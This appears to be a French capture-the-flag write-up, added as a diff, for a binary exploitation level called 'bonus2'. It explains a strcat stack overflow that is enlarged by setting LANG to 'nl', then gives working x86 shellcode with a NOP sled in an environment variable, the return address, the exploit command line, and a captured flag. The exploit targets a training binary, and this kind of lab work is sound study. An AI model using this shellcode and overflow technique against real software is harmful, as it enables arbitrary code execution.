@@ -1,0 +1,23 @@
+Le programme attend 2 arguments, il les copie dans un buffer, le 1er maximum 40char, 32char pour le 2eme.
+Ils sont encore une fois contigus dans le buffer si on entre 40 et 32 char.
+
+Le programme concat ensuite une phrase de bienvenue "Hello " et le buffer dans un second buffer.
+Ce dernier buffer a une taille de 72, donc si on entre 72 char au total dans les args on va overflow.
+Malheureusement, ce n'est pas sufisant pour override la return address.
+
+Il est possible de changer la phrase de bienvenue en changeant la variable d'env LANG.
+Si on la change par "nl", la phrase de bienvenue devient "Goedemiddag! ", ce qui est plus grand que "Hello ".
+Cela va nous permettre d'overflow sur la return address lors du call strcat,
+pour renvoyer sur un shellcode prensent dans l'env:
+
+	$ python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/exploitb2
+	$ export __SHELL="`cat /tmp/exploitb2`"
+Adresse de la vartiable d'env __SHELL: 0xbffffdb4 + 100 = 0xbffffe18 (milieu des nop)
+	$ export LANG="nl"
+	$ cd /tmp
+	$ vi source.c			# voir Ressources/source.c
+	$ gcc source.c -o get
+	$ cd
+	$ ./bonus2 `python -c 'print "A"*40'` `python -c 'print "B"*23 + "\x18\xfe\xff\xbf"'`
+	Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBB���
+	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
